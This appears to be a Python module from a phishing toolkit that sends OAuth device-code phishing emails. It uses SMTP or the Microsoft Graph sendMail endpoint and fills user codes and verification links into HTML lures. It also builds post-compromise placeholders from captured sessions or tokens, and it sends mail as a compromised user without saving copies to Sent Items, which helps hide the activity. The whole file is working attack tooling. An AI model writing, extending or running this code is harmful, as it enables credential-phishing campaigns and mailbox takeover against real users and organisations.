"""SMTP and Microsoft Graph email sending for phishing campaigns."""
import smtplib
import requests
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


def apply_template_placeholders(text: str, placeholders: dict) -> str:
    """Replace {{key}} placeholders in subject/body HTML."""
    result = text or ""
    for key, value in placeholders.items():
        result = result.replace(f"{{{{{key}}}}}", value or "")
    return result


def build_device_code_placeholders(user_code, verification_uri, message_display):
    return {
        "user_code": user_code or "",
        "verification_uri": verification_uri or "",
        "message": message_display or "",
    }


def build_post_auth_placeholders(session, token):
    ct = token
    given = (
        (getattr(session, "user_given_name", None) if session else None)
        or (getattr(ct, "user_given_name", None) if ct else None)
        or ""
    )
    family = (
        (getattr(session, "user_family_name", None) if session else None)
        or (getattr(ct, "user_family_name", None) if ct else None)
        or ""
    )
    user_name = (
        (session.user_display_name if session else None)
        or (ct.user_display_name if ct else None)
        or f"{given} {family}".strip()
        or given
        or ""
    )
    user_email = (
        (session.user_email if session else None)
        or (ct.user_email if ct else None)
        or (session.target_email if session else None)
        or ""
    )
    user_id = (
        (session.user_id if session else None)
        or (ct.user_id if ct else None)
        or ""
    )
    tenant_id = (
        (session.tenant_id if session else None)
        or (ct.tenant_id if ct else None)
        or ""
    )
    account_type = (
        (getattr(session, "account_type", None) if session else None)
        or (getattr(ct, "account_type", None) if ct else None)
        or ""
    )
    target_email = (session.target_email if session else None) or user_email or ""
    return {
        "user_name": user_name,
        "display_name": user_name,
        "name": user_name,
        "given_name": given,
        "family_name": family,
        "user_email": user_email,
        "user_id": user_id,
        "target_email": target_email,
        "tenant_id": tenant_id,
        "account_type": account_type,
    }


def build_post_auth_placeholders_sample(recipient_email: str):
    name = "Jane Doe"
    email = recipient_email or "jane.doe@contoso.com"
    return {
        "user_name": name,
        "display_name": name,
        "name": name,
        "user_email": email,
        "user_id": "00000000-0000-0000-0000-000000000001",
        "target_email": email,
        "tenant_id": "00000000-0000-0000-0000-000000000002",
    }


def send_html_email_smtp(smtp_config, to_email: str, subject: str, body_html: str, from_name: str = None):
    from_name = from_name or smtp_config.from_name or smtp_config.from_email
    msg = MIMEMultipart("alternative")
    msg["Subject"] = subject or ""
    msg["From"] = f"{from_name} <{smtp_config.from_email}>" if from_name else smtp_config.from_email
    msg["To"] = to_email
    msg.attach(MIMEText(body_html or "", "html"))

    if smtp_config.use_tls:
        with smtplib.SMTP(smtp_config.host, smtp_config.port) as server:
            server.starttls()
            if smtp_config.username:
                server.login(smtp_config.username, smtp_config.password or "")
            server.sendmail(smtp_config.from_email, [to_email], msg.as_string())
    else:
        with smtplib.SMTP(smtp_config.host, smtp_config.port) as server:
            if smtp_config.username:
                server.login(smtp_config.username, smtp_config.password or "")
            server.sendmail(smtp_config.from_email, [to_email], msg.as_string())
    return True


def send_html_email_graph(access_token: str, from_user_id_or_upn: str, to_email: str, subject: str, body_html: str):
    url = f"https://graph.microsoft.com/v1.0/users/{from_user_id_or_upn}/sendMail"
    payload = {
        "message": {
            "subject": subject or "",
            "body": {"contentType": "HTML", "content": body_html or ""},
            "toRecipients": [{"emailAddress": {"address": to_email}}],
        },
        "saveToSentItems": False,
    }
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json",
    }
    r = requests.post(url, json=payload, headers=headers, timeout=30)
    r.raise_for_status()
    return True


def send_phish_email(
    smtp_config,
    to_email: str,
    subject: str,
    body_html: str,
    user_code: str,
    verification_uri: str,
    message_display: str,
    from_name: str = None,
):
    """
    Send a single phishing email with device code instructions.
    Replaces placeholders in body: {{user_code}}, {{verification_uri}}, {{message}}
    """
    from_name = from_name or smtp_config.from_name or smtp_config.from_email
    placeholders = build_device_code_placeholders(user_code, verification_uri, message_display)
    body = apply_template_placeholders(body_html, placeholders)
    subject = apply_template_placeholders(subject or "Sign in to your account", placeholders)

    return send_html_email_smtp(smtp_config, to_email, subject, body, from_name=from_name)


def send_phish_email_via_graph(
    access_token: str,
    from_user_id_or_upn: str,
    to_email: str,
    subject: str,
    body_html: str,
    user_code: str,
    verification_uri: str,
    message_display: str,
):
    """
    Send a single phishing email via Microsoft Graph API (app must have Mail.Send and send-as user).
    from_user_id_or_upn: UPN (e.g. user@tenant.com) or user object id to send as.
    """
    placeholders = build_device_code_placeholders(user_code, verification_uri, message_display)
    body = apply_template_placeholders(body_html, placeholders)
    subject = apply_template_placeholders(subject or "Sign in to your account", placeholders)

    return send_html_email_graph(access_token, from_user_id_or_upn, to_email, subject, body)
